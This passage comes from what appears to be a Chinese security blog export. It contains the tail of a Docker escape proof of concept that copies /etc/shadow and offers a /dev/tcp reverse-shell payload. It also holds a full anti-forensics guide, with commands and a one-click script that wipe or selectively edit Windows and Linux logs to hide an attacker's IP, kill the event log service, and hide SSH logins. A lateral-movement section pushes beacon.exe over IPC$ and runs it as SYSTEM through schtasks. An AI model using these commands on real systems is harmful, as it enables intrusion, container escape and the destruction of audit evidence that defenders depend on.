class="hljs-regexp">/bin/</span>docker-runc.bak<br><br><span class="hljs-comment"># 3 启动一个docker容器</span><br>docker run -it --rm --name test ubuntu:<span class="hljs-number">18.04</span> <span class="hljs-regexp">/bin/</span>bash<br><br><span class="hljs-comment"># 4 将第一步编译的文件拷贝进容器，并且执行</span><br><br><span class="hljs-comment"># 5. 从主机上docker exec进这个容器，执行/bin/sh</span><br>执行完之后，poc会将<span class="hljs-regexp">/etc/</span>shadow文件复制到<span class="hljs-regexp">/tmp/</span>shadow<br><br>备注：如果需要反弹shell，只需要修改main.go里面的payload为：<br>payload = <span class="hljs-string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxxx 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure><h2 id="防止docker逃逸的方法"><a href="#防止docker逃逸的方法" class="headerlink" title="防止docker逃逸的方法"></a><strong>防止docker逃逸的方法</strong></h2><p>1、更新Docker版本到19.03.1及更高版本——CVE-2019-14271、覆盖CVE-2019-5736</p><p>2、runc版本 &gt; 1.0-rc6</p><p>3、k8s 集群版本&gt;1.12</p><p>4、Linux内核版本&gt;=2.6.22——CVE-2016-5195(脏牛)</p><p>5、Linux内核版本&gt;=4.14——CVE-2017–1000405(大脏牛)，未找到docker逃逸利用过程，但存在逃逸风险</p><p>6、不建议以root权限运行Docker服务</p><p>7、不建议以privileged（特权模式）启动Docker</p><p>8、不建议将宿主机目录挂载至容器目录</p><p>9、不建议将容器以—cap-add=SYSADMIN启动，SYSADMIN意为container进程允许执行mount、umount等一系列系统管理操作，<strong>存在容器逃逸风险</strong></p><p>参考：</p><p><a href="http://wjlshare.com/archives/1737">http://wjlshare.com/archives/1737</a></p><p><a href="https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</a></p><p><a href="https://zhuanlan.zhihu.com/p/442762675">https://zhuanlan.zhihu.com/p/442762675</a></p><p><a href="https://blog.csdn.net/qq_41874930/article/details/109216506">https://blog.csdn.net/qq_41874930/article/details/109216506</a></p>]]></content>
    
    
    <categories>
      
      <category>云原生安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>痕迹清理</title>
    <link href="/2022/04/04/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/"/>
    <url>/2022/04/04/%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h1><h2 id="win"><a href="#win" class="headerlink" title="win"></a>win</h2><h3 id="日志删除"><a href="#日志删除" class="headerlink" title="日志删除"></a>日志删除</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">应用程序日志：<span class="hljs-variable">%systemroot%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\A</span>ppEvent.EVT<br>安全日志：<span class="hljs-variable">%systemroot%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\S</span>ecEvent.EVT<br>系统日志：<span class="hljs-variable">%systemroot%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\S</span>ysEvent.EVT<br>DNS日志：<span class="hljs-variable">%sys temroot%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig，默认文件大小512KB<br>Internet信息服务FTP日志：<span class="hljs-variable">%systemroot%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\l</span>ogfiles<span class="hljs-symbol">\m</span>sftpsvc1<span class="hljs-symbol">\ </span>每天记录<br>Internet信息服务WWW日志：<span class="hljs-variable">%systemroot%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\l</span>ogfiles<span class="hljs-symbol">\w</span>3svc1<span class="hljs-symbol">\ </span>每天记录<br>Scheduler服务日志默认位置：<span class="hljs-variable">%sys temroot%</span><span class="hljs-symbol">\s</span>chedlgu.txt<br></code></pre></td></tr></table></figure><p>以上日志在注册表里的键：<br>应用程序日志，安全日志，系统日志，DNS服务器日志，它们这些LOG文件在注册表中的：<code>HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog</code> 有的管理员很可能将这些日志重定位。其中EVENTLOG下面有很多的子表，里面可查到以上日志的定位目录。Schedluler服务日志在注册表中<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent</code></p><h4 id="暴力删除"><a href="#暴力删除" class="headerlink" title="暴力删除"></a>暴力删除</h4><ol><li><p>eventvwr   自带管理器删除</p></li><li><p>wevtutil.exe   <code>&gt;=win7|admin</code></p></li></ol><p>获取日志分类列表：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wevtutil el<br></code></pre></td></tr></table></figure><p>获取单个日志类别的统计信息：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wevtutil gli &quot;windows powershell&quot;<br></code></pre></td></tr></table></figure><p>查看指定日志的具体内容：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wevtutil qe /f:text &quot;windows powershell&quot;<br></code></pre></td></tr></table></figure><p>删除单个日志类别的所有信息：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wevtutil cl &quot;windows powershell&quot;<br></code></pre></td></tr></table></figure><p>所有</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">wevtutil cl security<br>wevtutil cl Setup<br>wevtutil cl System<br>wevtutil cl Aplication<br>wevtutil cl Forwarded Events<br></code></pre></td></tr></table></figure><ol start="3"><li>powershell  <code>admin</code></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Clear-Eventlog</span> <span class="hljs-literal">-LogName</span> Security<br><span class="hljs-built_in">Clear-Eventlog</span> <span class="hljs-literal">-LogName</span> System<br></code></pre></td></tr></table></figure><h4 id="破坏日志记录进程"><a href="#破坏日志记录进程" class="headerlink" title="破坏日志记录进程"></a>破坏日志记录进程</h4><p>Windows日志对应于eventlog服务，找到该服务对应的进程svchost.exe，进而筛选出svchost.exe进程中具体实现日志功能的线程，调用TerminateThread结束线程，破坏日志记录功能</p><p>特别的地方：</p><p>由于只结束了实现日志功能的线程，所以Windows Event Log服务没有被破坏，状态仍为正在运行</p><p><a href="https://github.com/hlldz/Phant0m">Phant0m</a></p><p>定位eventlog服务对应进程svchost.exe的pid遍历该进程中的所有线程判断线程是否满足条件 Windows Event Log 服务需要调用wevtsvc.dll，完整路径为<code>%WinDir%\System32\wevtsvc.dll</code> 并且，如果线程调用了wevtsvc.dll，就可以判读该线程实现了日志记录功能结束线程 使用TerminateThread恢复方法 结束进程svchost.exe 重新开启Windows Event Log 服务：<code>net start eventlog</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">set-ExecutionPolicy</span> RemoteSigned   Y  <br>或者：<br>powershell <span class="hljs-literal">-ep</span> bypass<br><br>//<span class="hljs-built_in">kill</span> event log<br><span class="hljs-built_in">Invoke-Phant0m</span><br></code></pre></td></tr></table></figure><p>mimikatz</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">privilege::<span class="hljs-title">debug</span></span><br><span class="hljs-function"><span class="hljs-title">event</span>::</span><br></code></pre></td></tr></table></figure><p>msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">clearev<br>run clearlogs(仅包含应用、系统、安全三个类型)<br><br>run event_manager  -i<br>run event_manager  -c(六种类型均会删除)<br></code></pre></td></tr></table></figure><p><a href="https://github.com/3gstudent/Windows-EventLog-Bypass">Windows-EventLog-Bypass</a> </p><p><strong>IIS日志</strong></p><p>IIS默认日志路径：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%SystemDrive%</span><span class="hljs-symbol">\i</span>netpub<span class="hljs-symbol">\l</span>ogs<span class="hljs-symbol">\L</span>ogFiles<span class="hljs-symbol">\W</span>3SVC1\<br></code></pre></td></tr></table></figure><p>清除WWW日志：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">停止服务：<span class="hljs-built_in">net</span> stop w3svc<br>删除日志目录下所有文件：<span class="hljs-built_in">del</span> *.*<br>启用服务：<span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> w3svc<br></code></pre></td></tr></table></figure><h4 id="3389登陆记录清除"><a href="#3389登陆记录清除" class="headerlink" title="3389登陆记录清除"></a>3389登陆记录清除</h4><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off<br>@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f<br>@<span class="hljs-built_in">del</span> &quot;<span class="hljs-variable">%USERPROFILE%</span>\My Documents\Default.rdp&quot; /a<br>@<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><h4 id="清除recent"><a href="#清除recent" class="headerlink" title="清除recent"></a>清除recent</h4><p>在文件资源管理器中点击“查看”-;“选项”-;在常规-;隐私中点击”清除”按钮</p><p>或直接打开C:\Users\Administrator\Recent并删除所有内容</p><p>或在命令行中输入<code>del /f /s /q “%userprofile%\Recent*.*</code></p><h3 id="日志伪造"><a href="#日志伪造" class="headerlink" title="日志伪造"></a>日志伪造</h3><p>使用eventcreate这个命令行工具来伪造日志或者使用自定义的大量垃圾信息覆盖现有日志。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id <span class="hljs-number">500</span><br></code></pre></td></tr></table></figure><h3 id="擦除"><a href="#擦除" class="headerlink" title="擦除"></a>擦除</h3><h4 id="Cipher-命令多次覆写"><a href="#Cipher-命令多次覆写" class="headerlink" title="Cipher 命令多次覆写"></a>Cipher 命令多次覆写</h4><p>在删除文件后，可以利用Cipher 命令通过 /W 参数可反复写入其他数据覆盖已删除文件的硬盘空间，彻底删除数据防止被恢复。</p><p>比如，删除<code>D:\tools</code>目录下的文件，然后执行这条命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">cipher /w:D:\tools<br></code></pre></td></tr></table></figure><p>这样一来，D 盘上未使用空间就会被覆盖三次：一次 0x00、一次 0xFF，一次随机数，所有被删除的文件就都不可能被恢复了。</p><h4 id="Format命令覆盖格式化"><a href="#Format命令覆盖格式化" class="headerlink" title="Format命令覆盖格式化"></a>Format命令覆盖格式化</h4><p>Format 命令加上 /P 参数后，就会把每个扇区先清零，再用随机数覆盖。而且可以覆盖多次。比如：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">format</span> D: /P:<span class="hljs-number">8</span><br></code></pre></td></tr></table></figure><p>这条命令表示把 D 盘用随机数覆盖 8 次。</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="清除命令历史记录"><a href="#清除命令历史记录" class="headerlink" title="清除命令历史记录"></a>清除命令历史记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">histroy -r          <span class="hljs-comment">#删除当前会话历史记录</span><br><span class="hljs-built_in">history</span> -c          <span class="hljs-comment">#删除内存中的所有命令历史</span><br>rm .bash_history    <span class="hljs-comment">#删除历史文件中的内容</span><br>HISTZISE=0          <span class="hljs-comment">#通过设置历史命令条数来清除所有历史记录</span><br>vim ~/.bash_history <span class="hljs-comment">#删除不想保存的命令</span><br></code></pre></td></tr></table></figure><p>利用vim特性删除历史命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用vim打开一个文件</span><br>vi test.txt<br><span class="hljs-comment"># 设置vim不记录命令，Vim会将命令历史记录，保存在viminfo文件中。</span><br>:<span class="hljs-built_in">set</span> <span class="hljs-built_in">history</span>=0<br><span class="hljs-comment"># 用vim的分屏功能打开命令记录文件.bash_history，编辑文件删除历史操作命令</span><br>vsp ~/.bash_history<br><span class="hljs-comment"># 清除保存.bash_history文件即可。</span><br></code></pre></td></tr></table></figure><h3 id="在隐蔽的位置执行命令"><a href="#在隐蔽的位置执行命令" class="headerlink" title="在隐蔽的位置执行命令"></a>在隐蔽的位置执行命令</h3><p>使用vim打开文件执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">:<span class="hljs-built_in">set</span> <span class="hljs-built_in">history</span>=0<br>:!<span class="hljs-built_in">command</span><br></code></pre></td></tr></table></figure><h3 id="日志删除-1"><a href="#日志删除-1" class="headerlink" title="日志删除"></a>日志删除</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stata">/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">run</span>/utmp 记录现在登入的用户，使用w,who,users等命令查看<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/wtmp 记录用户所有的登入和登出，使用last命令查看<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/lastlog 记录每一个用户最后登入时间，使用lastlog命令查看<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/btmp 记录所有登录失败信息，使用lastb命令查看<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/auth.<span class="hljs-keyword">log</span> 需要身份确认的操作<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure 记录安全相关的日志信息<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/maillog 记录邮件相关的日志信息<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/message 记录系统启动后的信息和错误日志<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/cron 记录定时任务相关的日志信息<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/spooler 记录UUCP和<span class="hljs-keyword">news</span>设备相关的日志信息<br>/<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/<span class="hljs-keyword">boot</span>.<span class="hljs-keyword">log</span> 记录守护进程启动和停止相关的日志消息<br></code></pre></td></tr></table></figure><h4 id="全部删除"><a href="#全部删除" class="headerlink" title="全部删除"></a>全部删除</h4><p>清除登录系统失败的记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos]<span class="hljs-comment"># echo &gt; /var/log/btmp </span><br>[root@centos]<span class="hljs-comment"># lastb             //查询不到登录失败信息</span><br></code></pre></td></tr></table></figure><p>清除登录系统成功的记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@centos]<span class="hljs-comment"># echo &gt; /var/log/wtmp  </span><br>[root@centos]<span class="hljs-comment"># last              //查询不到登录成功的信息</span><br></code></pre></td></tr></table></figure><p>清除相关日志信息：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd">清除用户最后一次登录时间：<span class="hljs-built_in">echo</span> &gt; /var/log/lastlog          #lastlog命令<br>清除当前登录用户的信息：<span class="hljs-built_in">echo</span> &gt;   /var/log/utmp             #使用w,who,users等命令<br>清除安全日志记录：cat /dev/null &gt;  /var/log/secure<br>清除系统日志记录：cat /dev/null &gt;  /var/log/message<br></code></pre></td></tr></table></figure><h4 id="删除-替换部分日志"><a href="#删除-替换部分日志" class="headerlink" title="删除/替换部分日志"></a>删除/替换部分日志</h4><p>日志文件全部被清空，太容易被管理员察觉了，如果只是删除或替换部分关键日志信息，那么就可以完美隐藏攻击痕迹。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</span><br>sed  -i <span class="hljs-string">&#x27;/自己的ip/&#x27;</span>d  /var/<span class="hljs-built_in">log</span>/messages<br><br><span class="hljs-comment"># 全局替换登录IP地址：</span><br>sed -i <span class="hljs-string">&#x27;s/192.168.166.85/192.168.1.1/g&#x27;</span> secure<br><br><span class="hljs-comment"># 删除当天日志</span><br>sed  -i <span class="hljs-string">&#x27;/当天日期/&#x27;</span>d  filename<br></code></pre></td></tr></table></figure><p>一键清除的bash脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/bash</span><br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/syslog<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/messages<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/httpd/access_log<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/httpd/error_log<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/xferlog<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/secure<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/auth.log<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/user.log<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/wtmp<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/lastlog<br><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/btmp<br><span class="hljs-built_in">echo</span> &gt; /var/run/utmp<br>rm ~/./bash_history<br><span class="hljs-built_in">history</span> -c<br></code></pre></td></tr></table></figure><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p>shred</p><p>实现安全的从硬盘上擦除数据，默认覆盖3次，通过 -n指定数据覆盖次数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">shred -f -u -z -v -n 8 1.txt <br></code></pre></td></tr></table></figure><p>dd</p><p>可用于安全地清除硬盘或者分区的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dd <span class="hljs-keyword">if</span>=/dev/zero of=要删除的文件 bs=大小 count=写入的次数<br></code></pre></td></tr></table></figure><p>wipe</p><p>使用特殊的模式来重复地写文件，从磁性介质中安全擦除文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wipe filename<br></code></pre></td></tr></table></figure><p>Secure-Delete</p><p>Secure-Delete 是一组工具集合，提供srm、smem、sfill、sswap，4个安全删除文件的命令行工具。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">srm filename<br>sfill filename<br>sswap <span class="hljs-regexp">/dev/</span>sda1<br>smem<br></code></pre></td></tr></table></figure><h3 id="隐藏远程SSH登陆记录"><a href="#隐藏远程SSH登陆记录" class="headerlink" title="隐藏远程SSH登陆记录"></a>隐藏远程SSH登陆记录</h3><p>隐身登录系统，不会被w、who、last等指令检测到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -T root@192.168.0.1 /bin/bash -i<br></code></pre></td></tr></table></figure><p>不记录ssh公钥在本地.ssh目录中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>横向移动</title>
    <link href="/2022/03/31/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <url>/2022/03/31/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>IPC(Inter Process Connection)共享<code>命名管道</code>的资源，是为了实现进程间通信而开放的命名管道。<code>IPC</code>可以通过验证用户名和密码获取相应权限，通常在远程管理计算机和查看计算机的共享资源时使用</p><p>通过<code>ipc$</code>可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器只能够的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息</p><p>建立一个<code>ipc$</code>并查看当前连接输入如下命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\ip\ipc$ &quot;password&quot; /user:administrator<br><span class="hljs-built_in">net</span> use<br></code></pre></td></tr></table></figure><p><strong>利用条件：</strong>开启139(NetBIOS)、445端口，管理员开启了默认共享，一般默认开启，对应的逻辑盘也可以访问到</p><p><strong>报错：</strong></p><ul><li>错误号5:拒绝访问</li><li>错误号51:windows无法找到网络路径，即网络中存在问题</li><li>错误号53:找不到网络路径，包括IP地址错误、目标未开机、目标lanmanserver服务未启动、目标有防火墙（端口过滤）</li><li>错误号67:找不到网络名，包括lanmanworkstation服务未启动、ipc$已被删除</li><li>错误号1219:提供的凭据与已存在的凭据集冲突。例如，已经和目标建立了ipc$,需要在删除原连接后重新进行连接</li><li>错误号1326:未知的用户名或密码错误</li><li>错误号1792:试图登录，但是网络登录服务没有启动，包括目标NetLogin服务未启动（连接域控制器时会出现此情况）</li><li>错误号2242:此用户的密码已经过期。例如，目标机器设置了账号管理策略，强制用户定期修改密码</li></ul><p>IPC建立后</p><blockquote><p>dir \\ip\C$</p><p>tasklist /S ip /U administrator /P 123456</p><p>net time \\ip</p><p>copy beacon.exe \\ip\C$</p><p>at \\ip  19:00:00 C:\beacon.exe</p><p>at \\ip /delete</p><p>//Windows Vista、windows server2008及之后版本的操作系统已将at命令废弃了</p><p>schtasks /create /s ip /tn test /sc onstart c:\beacon.exe /ru system /f</p><p>schtasks /run /s ip /i /tn “test”</p><p>schtasks /delete /s ip  /tn “test” /f</p><p>net use \\ip  /del /y</p></blockquote><h2 id="Windows-hash"><a href="#Windows-hash" class="headerlink" title="Windows hash"></a>Windows hash</h2><p><a href="https://xz.aliyun.com/t/8117#toc-16">https://xz.aliyun.com/t/8117#toc-16</a></p><p>Windows认证协议有两种NTLM（NT LAN Manager）和Kerberos，前者主要应用于用于Windows NT 和 Windows 2000 Server（or  Later） 工作组环境，而后者则主要应用于Windows 2000 Server（or Later） 域（Domain）环境</p><h3 id="LM-Hash-amp-NTLM-Hash"><a href="#LM-Hash-amp-NTLM-Hash" class="headerlink" title="LM Hash&amp;NTLM Hash"></a>LM Hash&amp;NTLM Hash</h3><p>windows操作系统密码一般由两部分组成，一部分为<code>LM Hash</code>另一部分为<code>NTLM Hash</code>在Windows中，Hash的结构通常如下</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>RID:LM-HASH:NT-HASH<br></code></pre></td></tr></table></figure><p><strong>LM Hash</strong>全名为<code>LAN Manager Hash</code>是微软为了提高windows操作系统的安全性能而采用的散列加密算法，其<strong>本质是DES加密，密码不足14字节将用0补全</strong>。LM Hash较容易破解，但微软仅仅是将LM Hash禁用了<code>从windows Vista和windows server 2008版本开始，Windows操作系统默认禁用LM Hash</code>。LM Hash明文密码限定在14位以内，也就是说，如果要停止使用LM Hash 将用户密码设置为14位以上即可。如果抓取的LM Hash通常为<strong>AAD3B435B51404EEAAD3B435B51404EE</strong>表示<strong>密码为空或<code>LM Hash</code>被禁用</strong></p><p><strong>NTLM Hash</strong>是微软为了提高安全性的同时兼容而设计的散列加密算法。NTLM Hash 是<strong>基于MD4加密算法</strong>进行加密的。个人版从Windows vista 服务器版从windows server2003以后，windows操作系统的认证方式均为NTLM Hash</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200807162946-26dfbf56-d888-1.png"></p><p><strong>Net-NTLM Hash</strong></p><p>存在两个版本</p><p><strong>Net-NTLMv1:window2003和window xp之前默认启用</strong></p><p>Net-ntlm hash v1的格式为username::hostname:LM response:NTLM response:challenge</p><p>由于v1版本的加密方式比较脆弱，很容易解密得到NTLM Hash,基本在可控时间内能解出。</p><p><strong>Net-NTLMv2:window2008 和 window Vist之后默认启用</strong></p><p>Net-ntlm hash v2的格式为username::domain:challenge:HMAC-MD5:blob</p><p>v2版本,加密方式比较强，但是可以进行明文爆破，利用难度比较大。</p><p>NTLM使用在Windows NT和Windows 2000 Server（or  later）工作组环境中（Kerberos用在域模式下）；在AD域环境中，如果需要认证Windows  NT系统，也必须采用NTLM。NTLM主要是一种<strong>基于挑战（challenge）/响应（response）消息交互模式的认证过程</strong>：</p><p>  1、用户登录时输入的user name、password和domain name，然后Client端计算password的hash值并保存在本地；</p><p>  2、客户端将user name的明文发送给DC；</p><p>  3、DC生成一个16-byte的随机数，叫做challenge，传输给client；</p><p>  4、client收到challenge以后，在复制一份拷贝，然后将其中一个challenge用password hash加密，这个叫做response，然后将challenge，response以及user name传送给server；</p><p>  5、server端在收到client传送过来的三份内容以后将它们转发给DC；</p><p>  6、DC在收到user name，response，challenge以后，根据user name在account database中找到其对应的password hash，然后用这个password hash加密challenge；</p><p>  7、DC将response跟加密后的challenge进行比较，如果相同则NTLM验证成功。DC将验证结果发给Server，并最终返回给Client。</p><p>  如果是使用本地用户身份进行认证，则有Server本身完成认证过程。</p><p><strong>hash储存：SAM文件(local)、NTDS.DIT文件(domain)</strong></p><blockquote><p>SAM(Security Account Manager) 安全账户管理器是一个数据库文件，在Windows  XP，Windows Vista,windows7-10用于存储用户的密码。他可以用来验证本地和远程用户。在windows 2000 sp4  开始,Active Dircetory 对远程用户进行身份验证。SAM使用加密措施来防止未经身份验证的用户访问系统。</p><p>用户密码以哈希格式存储在 注册表配置单元中(registry hive), 作为LM Hash or NTLM Hash.</p><p>这个文件可以在<code>%SystemRoot%/system32/config/SAM</code> 和 